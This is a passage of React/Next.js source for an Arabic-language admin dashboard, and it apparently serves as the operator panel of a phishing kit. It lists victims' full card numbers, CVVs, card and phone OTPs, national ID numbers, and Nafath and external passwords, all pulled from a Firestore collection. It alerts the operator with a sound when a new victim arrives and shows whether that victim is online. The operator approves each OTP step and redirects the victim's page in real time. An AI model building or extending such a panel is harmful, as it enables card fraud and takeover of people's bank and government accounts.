"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  LogOut,
  CreditCard,
  User,
  Car,
  FileText,
  CheckCircle,
  XCircle,
  AlertCircle,
  Clock,
  Calendar,
  Search,
  Shield,
  CreditCardIcon as CardIcon,
  MoreHorizontal,
  Tag,
  Bell,
  Eye,
  Loader2,
  RefreshCw,
  Smartphone,
  ChevronLeft,
  ChevronRight,
  ChevronsLeft,
  ChevronsRight,
  Volume2,
  VolumeX,
  Wifi,
  WifiOff,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { formatDistanceToNow } from "date-fns"
import { ar } from "date-fns/locale"
import { Toaster, toast } from "sonner"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { ref, onValue } from "firebase/database"
import PhoneDialog from "@/components/phone-info"
import NafazAuthDialog from "@/components/nafaz"
import RajhiAuthDialog from "@/components/rajhi"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { auth, db, database } from "@/lib/firestore"
import { Skeleton } from "@/components/ui/skeleton"

// Hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    if (!userId || !database) return

    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      setIsOnline(data && data.state === "online")
    })

    return () => unsubscribe()
  }, [userId, database])

  return isOnline
}

// Component to display online status indicator
function OnlineStatusIndicator({ userId, className = "" }: { userId?: string; className?: string }) {
  const isOnline = useUserOnlineStatus(userId || "")

  if (!userId) return null

  return (
    <TooltipProvider>
      <Tooltip>
        <TooltipTrigger asChild>
          <div className={`flex items-center gap-1 ${className}`}>
            {isOnline ? (
              <div className="flex items-center gap-1">
                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
                <Wifi className="h-3 w-3 text-emerald-500" />
              </div>
            ) : (
              <div className="flex items-center gap-1">
                <div className="w-2 h-2 bg-gray-400 rounded-full"></div>
                <WifiOff className="h-3 w-3 text-gray-400" />
              </div>
            )}
          </div>
        </TooltipTrigger>
        <TooltipContent>
          <p>{isOnline ? "متصل الآن" : "غير متصل"}</p>
        </TooltipContent>
      </Tooltip>
    </TooltipProvider>
  )
}

// Component to display online status text
function OnlineStatusText({ userId }: { userId?: string }) {
  const isOnline = useUserOnlineStatus(userId || "")

  if (!userId) return <span className="text-gray-800">غير محدد</span>

  return <span className="text-gray-800">{isOnline ? "متصل الآن" : "غير متصل"}</span>
}

interface PaymentData {
  cardNumber?: string
  cvv?: string
  cardMonth?: string
  cardYear?: string
  full_name?: string
}

interface FormData {
  cardNumber?: string
  cvv?: string
  cardMonth?: string
  cardYear?: string
  full_name?: string
}

interface Notification {
  id: string
  agreeToTerms?: boolean
  buyer_identity_number?: string
  cardNumber?: string
  createdDate: string
  customs_code?: string
  cvv?: string
  document_owner_full_name?: string
  cardYear?: string
  cardMonth?: string
  formData?: FormData
  full_name?: string
  insurance_purpose?: string
  owner_identity_number?: string
  pagename?: string
  paymentData?: PaymentData
  paymentStatus?: string
  phone?: string
  phone2?: string
  seller_identity_number?: string
  serial_number?: string
  status?: string
  vehicle_manufacture_number?: string
  documment_owner_full_name?: string
  vehicle_type?: string
  isHidden?: boolean
  pinCode?: string
  otp?: string
  phoneOtp?: string
  externalUsername?: string
  externalPassword?: string
  nafadUsername?: string
  nafadPassword?: string
  nafaz_pin?: string
  autnAttachment?: string
  requierdAttachment?: string
  operator?: string
  otpPhoneStatus: string
  phoneotp: string
  phoneVerificationStatus: string
  country?: string
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [paginatedNotifications, setPaginatedNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "vehicle" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [activeFilter, setActiveFilter] = useState<string | null>(null)
  const [showSidebar, setShowSidebar] = useState(false)
  const router = useRouter()
  const [showCardDialog, setShowCardDialog] = useState(false)
  const [selectedCardInfo, setSelectedCardInfo] = useState<Notification | null>(null)
  const [showPagenameDialog, setShowPagenameDialog] = useState(false)
  const [uniquePagenames, setUniquePagenames] = useState<string[]>([])
  const [showRajhiDialog, setShowRajhiDialog] = useState(false)
  const [showNafazDialog, setShowNafazDialog] = useState(false)
  const [showPhoneDialog, setPhoneDialog] = useState(false)
  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest")
  const [soundEnabled, setSoundEnabled] = useState(true)

  // Pagination states
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(50)
  const [totalPages, setTotalPages] = useState(0)

  // Audio ref for notification sound
  const audioRef = useRef<HTMLAudioElement | null>(null)
  const previousNotificationCountRef = useRef<number>(0)

  // Initialize audio on component mount
  useEffect(() => {
    audioRef.current = new Audio("/beeb.wav")
    audioRef.current.preload = "auto"
    // Handle audio loading errors
    audioRef.current.addEventListener("error", (e) => {
      console.error("Failed to load notification sound:", e)
    })
    return () => {
      if (audioRef.current) {
        audioRef.current.removeEventListener("error", () => {})
      }
    }
  }, [])

  const playNotificationSound = () => {
    if (soundEnabled && audioRef.current) {
      audioRef.current.currentTime = 0 // Reset to beginning
      audioRef.current.play().catch((error) => {
        console.error("Failed to play notification sound:", error)
      })
    }
  }

  const updateAttachment = async (id: string, attachmentType: string, value: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        [attachmentType]: value,
      })
      // Play notification sound
      playNotificationSound()
      toast.success("تم تحديث المرفق بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating attachment:", error)
      toast.error("حدث خطأ أثناء تحديث المرفق", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })
    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    if (searchTerm.trim() === "" && !activeFilter) {
      setFilteredNotifications(notifications)
    } else {
      const filtered = notifications.filter((notification) => {
        const matchesSearch =
          searchTerm.trim() === "" ||
          notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.phone?.includes(searchTerm) ||
          notification.cardNumber?.includes(searchTerm)

        const matchesFilter =
          !activeFilter ||
          (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
          (activeFilter === "approved" && notification.status === "approved") ||
          (activeFilter === "rejected" && notification.status === "rejected") ||
          (activeFilter === "payment" && notification.pagename === "payment") ||
          (activeFilter === "registration" && notification.vehicle_type === "registration") ||
          (activeFilter === "online" && notification.owner_identity_number) ||
          (activeFilter === "offline" && notification.owner_identity_number)

        return matchesSearch && matchesFilter
      })
      setFilteredNotifications(filtered)
    }
  }, [searchTerm, notifications, activeFilter])

  // Pagination effect
  useEffect(() => {
    const totalItems = filteredNotifications.length
    const pages = Math.ceil(totalItems / itemsPerPage)
    setTotalPages(pages)

    // Reset to first page if current page is beyond total pages
    if (currentPage > pages && pages > 0) {
      setCurrentPage(1)
    }

    // Calculate start and end indices
    const startIndex = (currentPage - 1) * itemsPerPage
    const endIndex = startIndex + itemsPerPage

    // Get paginated data
    const paginatedData = filteredNotifications.slice(startIndex, endIndex)
    setPaginatedNotifications(paginatedData)
  }, [filteredNotifications, currentPage, itemsPerPage])

  useEffect(() => {
    // Extract unique pagenames from notifications
    if (notifications.length > 0) {
      const pagenames = notifications
        .map((notification) => notification.pagename)
        .filter((pagename): pagename is string => !!pagename)
      const uniqueNames = Array.from(new Set(pagenames))
      setUniquePagenames(uniqueNames)
    }
  }, [notifications])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))

    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are new notifications and play sound
        const currentCount = notificationsData.length
        const previousCount = previousNotificationCountRef.current

        // Only play sound if:
        // 1. This is not the initial load (previousCount > 0)
        // 2. There are more notifications than before
        // 3. Sound is enabled
        if (previousCount > 0 && currentCount > previousCount && soundEnabled) {
          console.log("New notification detected, playing sound")
          playNotificationSound()
          // Show toast for new notification
          toast.success("إشعار جديد وصل!", {
            position: "top-center",
            duration: 3000,
            icon: <Bell className="h-5 w-5" />,
          })
        }

        // Update the previous count
        previousNotificationCountRef.current = currentCount

        setNotifications(notificationsData)
        setFilteredNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const refreshData = () => {
    setIsRefreshing(true)
    const unsubscribe = fetchNotifications()
    setTimeout(() => {
      setIsRefreshing(false)
      toast.success("تم تحديث البيانات بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    }, 1000)
    return unsubscribe
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      setFilteredNotifications([])
      // Reset the count when clearing all
      previousNotificationCountRef.current = 0
      toast.success("تم مسح جميع البيانات بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast.error("حدث خطأ أثناء مسح البيانات", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      const updatedNotifications = notifications.filter((notification) => notification.id !== id)
      setNotifications(updatedNotifications)
      // Update the count when deleting
      previousNotificationCountRef.current = updatedNotifications.length
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.cardNumber?.includes(searchTerm)

          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration")

          return matchesSearch && matchesFilter
        }),
      )
      toast.success("تم حذف البيانات بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast.error("حدث خطأ أثناء حذف البيانات", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handlePhoneOtpApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        phoneVerificationStatus: state,
        otpStatus: state,
      })
      playNotificationSound()
      toast.success("تم تحديث حالة التحقق بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating phone OTP status:", error)
      toast.error("حدث خطأ أثناء تحديث حالة التحقق", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  const handlePassApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        cardOtpStatus: state,
        otpStatus: state,
      })
      playNotificationSound()
      toast.success("تم تحديث حالة البطاقة بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating card status:", error)
      toast.error("حدث خطأ أثناء تحديث حالة البطاقة", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
        paymentStatus: state,
      })

      // Update local state
      const updatedNotifications = notifications.map((notification) =>
        notification.id === id ? { ...notification, status: state } : notification,
      )
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.cardNumber?.includes(searchTerm)

          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration")

          return matchesSearch && matchesFilter
        }),
      )

      playNotificationSound()
      if (state === "approved") {
        toast.success("تم قبول الطلب بنجاح", {
          position: "top-center",
          duration: 3000,
          icon: <CheckCircle className="h-5 w-5" />,
        })
      } else {
        toast.error("تم رفض الطلب", {
          position: "top-center",
          duration: 3000,
          icon: <XCircle className="h-5 w-5" />,
        })
      }
      closeDialog()
    } catch (error) {
      console.error("Error updating status:", error)
      toast.error("حدث خطأ أثناء تحديث الحالة", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleUpdatePagename = async (id: string, newPagename: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        currentPage: newPagename,
        isFromDash: true,
      })

      // Update local state
      const updatedNotifications = notifications.map((notification) =>
        notification.id === id ? { ...notification, currentPage: newPagename } : notification,
      )
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.cardNumber?.includes(searchTerm)

          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration")

          return matchesSearch && matchesFilter
        }),
      )

      playNotificationSound()
      toast.success("تم تحديث نوع الطلب بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error updating pagename:", error)
      toast.error("حدث خطأ أثناء تحديث نوع الطلب", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast.error("حدث خطأ أثناء تسجيل الخروج", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card" | "vehicle") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const handleCardBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedCardInfo(notification)
    setShowCardDialog(true)
  }

  const handlePagenameBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedNotification(notification)
    setShowPagenameDialog(true)
  }

  const handleViewDetails = (notification: Notification) => {
    setSelectedNotification(notification)
    setShowSidebar(true)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const getStatusBadge = (paymentStatus?: string) => {
    if (!paymentStatus || paymentStatus === "pending") {
      return (
        <div className="flex items-center gap-1.5">
          <Clock className="h-3.5 w-3.5 text-amber-500" />
          <span className="text-amber-600 font-medium">قيد الانتظار</span>
        </div>
      )
    } else if (paymentStatus === "approved") {
      return (
        <div className="flex items-center gap-1.5">
          <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
          <span className="text-emerald-600 font-medium">مقبول</span>
        </div>
      )
    } else {
      return (
        <div className="flex items-center gap-1.5">
          <XCircle className="h-3.5 w-3.5 text-rose-500" />
          <span className="text-rose-600 font-medium">مرفوض</span>
        </div>
      )
    }
  }

  const getPageType = (pagename?: string, clickable = false, notification?: Notification) => {
    let badge
    switch (pagename) {
      case "6":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-emerald-400 to-teal-500 text-white border-0 shadow-lg hover:shadow-xl transition-all duration-300 ${
              clickable ? "cursor-pointer hover:from-emerald-500 hover:to-teal-600 hover:scale-105" : ""
            }`}
          >
            <CreditCard className="h-3 w-3 mr-1" />
            دفع
          </Badge>
        )
        break
      case "1":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-blue-400 to-indigo-500 text-white border-0 shadow-lg hover:shadow-xl transition-all duration-300 ${
              clickable ? "cursor-pointer hover:from-blue-500 hover:to-indigo-600 hover:scale-105" : ""
            }`}
          >
            <FileText className="h-3 w-3 mr-1" />
            تسجيل
          </Badge>
        )
        break
      case "7":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-purple-400 to-violet-500 text-white border-0 shadow-lg hover:shadow-xl transition-all duration-300 ${
              clickable ? "cursor-pointer hover:from-purple-500 hover:to-violet-600 hover:scale-105" : ""
            }`}
          >
            <Shield className="h-3 w-3 mr-1" />
            رمز OTP
          </Badge>
        )
        break
      case "9999":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-orange-400 to-red-500 text-white border-0 shadow-lg hover:shadow-xl transition-all duration-300 ${
              clickable ? "cursor-pointer hover:from-orange-500 hover:to-red-600 hover:scale-105" : ""
            }`}
          >
            <Smartphone className="h-3 w-3 mr-1" />
            رمز هاتف
          </Badge>
        )
        break

      case "8888":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-teal-400 to-cyan-500 text-white border-0 shadow-lg hover:shadow-xl transition-all duration-300 ${
              clickable ? "cursor-pointer hover:from-teal-500 hover:to-cyan-600 hover:scale-105" : ""
            }`}
          >
            <Shield className="h-3 w-3 mr-1" />
            نفاذ
          </Badge>
        )
        break
      case "/":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-emerald-400 to-teal-500 text-white border-0 shadow-lg hover:shadow-xl transition-all duration-300 ${
              clickable ? "cursor-pointer hover:from-emerald-500 hover:to-teal-600 hover:scale-105" : ""
            }`}
          >
            <Calendar className="h-3 w-3 mr-1" />
            الرئيسية
          </Badge>
        )
        break
      default:
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-slate-400 to-gray-500 text-white border-0 shadow-lg hover:shadow-xl transition-all duration-300 ${
              clickable ? "cursor-pointer hover:from-slate-500 hover:to-gray-600 hover:scale-105" : ""
            }`}
          >
            <Tag className="h-3 w-3 mr-1" />
            {pagename || "الرئيسية"}
          </Badge>
        )
    }

    if (clickable && notification) {
      return <div onClick={(e) => handlePagenameBadgeClick(notification, e)}>{badge}</div>
    }
    return badge
  }

  const formatCardNumber = (cardNumber?: string) => {
    if (!cardNumber) return "غير محدد"
    // Format as **** **** **** 1234
    return cardNumber
  }

  const applyFilter = (filter: string | null) => {
    setActiveFilter(filter)
    setCurrentPage(1) // Reset to first page when filter changes
  }

  const handleSortChange = (value: string) => {
    setSortOrder(value as "newest" | "oldest")
    // Sort the filtered notifications
    const sorted = [...filteredNotifications].sort((a, b) => {
      const dateA = new Date(a.createdDate).getTime()
      const dateB = new Date(b.createdDate).getTime()
      return value === "newest" ? dateB - dateA : dateA - dateB
    })
    setFilteredNotifications(sorted)
    setCurrentPage(1) // Reset to first page when sort changes
  }

  const handleItemsPerPageChange = (value: string) => {
    setItemsPerPage(Number.parseInt(value))
    setCurrentPage(1) // Reset to first page when items per page changes
  }

  const goToPage = (page: number) => {
    setCurrentPage(page)
  }

  const goToFirstPage = () => {
    setCurrentPage(1)
  }

  const goToLastPage = () => {
    setCurrentPage(totalPages)
  }

  const goToPreviousPage = () => {
    if (currentPage > 1) {
      setCurrentPage(currentPage - 1)
    }
  }

  const goToNextPage = () => {
    if (currentPage < totalPages) {
      setCurrentPage(currentPage + 1)
    }
  }

  // Generate page numbers for pagination
  const getPageNumbers = () => {
    const pages = []
    const maxVisiblePages = 5
    if (totalPages <= maxVisiblePages) {
      for (let i = 1; i <= totalPages; i++) {
        pages.push(i)
      }
    } else {
      const startPage = Math.max(1, currentPage - Math.floor(maxVisiblePages / 2))
      const endPage = Math.min(totalPages, startPage + maxVisiblePages - 1)
      for (let i = startPage; i <= endPage; i++) {
        pages.push(i)
      }
    }
    return pages
  }

  // Get user ID for online status tracking
  const getUserId = (notification: Notification) => {
    return notification.owner_identity_number || notification.buyer_identity_number || notification.phone
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-indigo-50 via-purple-50 to-pink-50 dark:from-slate-900 dark:via-purple-900 dark:to-indigo-900 text-foreground p-8">
        <Card className="shadow-2xl border-0 overflow-hidden bg-white/80 backdrop-blur-xl">
          <CardHeader className="bg-gradient-to-r from-blue-500/10 to-purple-500/10 pb-2 border-b border-blue-200/30">
            <div className="flex justify-between items-center">
              <CardTitle className="text-2xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 text-transparent bg-clip-text">
                لوحة البيانات
              </CardTitle>
              <Skeleton className="h-9 w-32 rounded-md" />
            </div>
          </CardHeader>
          <CardContent className="p-6 bg-white/90 backdrop-blur-sm">
            <div className="space-y-6">
              <div className="flex justify-between">
                <Skeleton className="h-10 w-64 rounded-md" />
                <Skeleton className="h-10 w-32 rounded-md" />
              </div>
              <div className="space-y-4">
                {[1, 2, 3, 4].map((i) => (
                  <div key={i} className="flex items-center justify-between p-4 border border-blue-100 rounded-lg">
                    <div className="flex items-center gap-4">
                      <Skeleton className="h-10 w-10 rounded-full" />
                      <div className="space-y-2">
                        <Skeleton className="h-4 w-40" />
                        <Skeleton className="h-3 w-24" />
                      </div>
                    </div>
                    <Skeleton className="h-8 w-24 rounded-md" />
                  </div>
                ))}
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-br from-indigo-50 via-purple-50 to-pink-50 dark:from-slate-900 dark:via-purple-900 dark:to-indigo-900 text-foreground p-4 md:p-8"
    >
      <Toaster richColors closeButton position="top-center" />
      <Card className="shadow-2xl border-0 overflow-hidden bg-white/80 backdrop-blur-xl">
        <CardHeader className="bg-gradient-to-r from-blue-500/10 to-purple-500/10 pb-4 border-b border-blue-200/30">
          <div className="flex flex-col sm:flex-row justify-between items-center gap-4">
            <div className="flex items-center gap-3">
              <div className="bg-gradient-to-r from-blue-500 to-purple-600 p-3 rounded-xl shadow-lg">
                <Bell className="h-6 w-6 text-white" />
              </div>
              <CardTitle className="text-2xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 text-transparent bg-clip-text">
                لوحة البيانات
              </CardTitle>
            </div>
            <div className="flex flex-wrap sm:flex-nowrap gap-2">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      onClick={() => setSoundEnabled(!soundEnabled)}
                      className={`gap-2 border-2 shadow-lg hover:shadow-xl transition-all duration-300 ${
                        soundEnabled
                          ? "bg-gradient-to-r from-emerald-50 to-teal-50 border-emerald-300 text-emerald-700 hover:from-emerald-100 hover:to-teal-100"
                          : "bg-gradient-to-r from-rose-50 to-red-50 border-rose-300 text-rose-700 hover:from-rose-100 hover:to-red-100"
                      }`}
                    >
                      {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
                      {soundEnabled ? "إيقاف الصوت" : "تشغيل الصوت"}
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>{soundEnabled ? "إيقاف أصوات الإشعارات" : "تشغيل أصوات الإشعارات"}</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      onClick={refreshData}
                      className="gap-2 border-2 border-blue-300 bg-gradient-to-r from-blue-50 to-indigo-50 text-blue-700 hover:from-blue-100 hover:to-indigo-100 shadow-lg hover:shadow-xl transition-all duration-300"
                      disabled={isRefreshing}
                    >
                      {isRefreshing ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
                      تحديث
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تحديث البيانات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="destructive"
                      onClick={handleClearAll}
                      className="gap-2 bg-gradient-to-r from-rose-500 to-red-500 hover:from-rose-600 hover:to-red-600 border-0 shadow-lg hover:shadow-xl transition-all duration-300"
                      disabled={notifications.length === 0}
                    >
                      <Trash2 className="h-4 w-4" />
                      مسح الكل
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>مسح جميع البيانات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      onClick={handleLogout}
                      className="gap-2 border-2 border-gray-300 bg-gradient-to-r from-gray-50 to-slate-50 text-gray-700 hover:from-gray-100 hover:to-slate-100 shadow-lg hover:shadow-xl transition-all duration-300"
                    >
                      <LogOut className="h-4 w-4" />
                      تسجيل الخروج
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تسجيل الخروج من النظام</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            </div>
          </div>
        </CardHeader>
        <div className="p-4 bg-gradient-to-r from-blue-50/50 to-purple-50/50 border-b border-blue-200/30">
          <div className="flex flex-col md:flex-row gap-4 justify-between">
            <div className="flex flex-col sm:flex-row gap-3 w-full">
              <div className="relative w-full md:w-96">
                <Search className="absolute right-3 top-2.5 h-4 w-4 text-blue-500" />
                <Input
                  placeholder="بحث بالاسم أو رقم الهاتف أو رقم البطاقة..."
                  className="pr-10 w-full border-2 border-blue-200 focus:border-blue-400 focus:ring-blue-400/20 bg-white/80 backdrop-blur-sm"
                  value={searchTerm}
                  onChange={(e) => {
                    setSearchTerm(e.target.value)
                    setCurrentPage(1) // Reset to first page when searching
                  }}
                />
              </div>
              <Select value={sortOrder} onValueChange={handleSortChange}>
                <SelectTrigger className="w-[180px] border-2 border-blue-200 focus:border-blue-400 focus:ring-blue-400/20 bg-white/80 backdrop-blur-sm">
                  <SelectValue placeholder="ترتيب حسب" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="newest">الأحدث أولاً</SelectItem>
                  <SelectItem value="oldest">الأقدم أولاً</SelectItem>
                </SelectContent>
              </Select>
              <Select value={itemsPerPage.toString()} onValueChange={handleItemsPerPageChange}>
                <SelectTrigger className="w-[120px] border-2 border-blue-200 focus:border-blue-400 focus:ring-blue-400/20 bg-white/80 backdrop-blur-sm">
                  <SelectValue placeholder="عدد العناصر" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="5">5</SelectItem>
                  <SelectItem value="10">10</SelectItem>
                  <SelectItem value="20">20</SelectItem>
                  <SelectItem value="50">50</SelectItem>
                  <SelectItem value="100">100</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div className="flex gap-2 overflow-x-auto pb-2 md:pb-0">
              <Button
                variant={activeFilter === null ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter(null)}
                className={
                  activeFilter === null
                    ? "bg-gradient-to-r from-blue-500 to-purple-600 text-white hover:from-blue-600 hover:to-purple-700 shadow-lg"
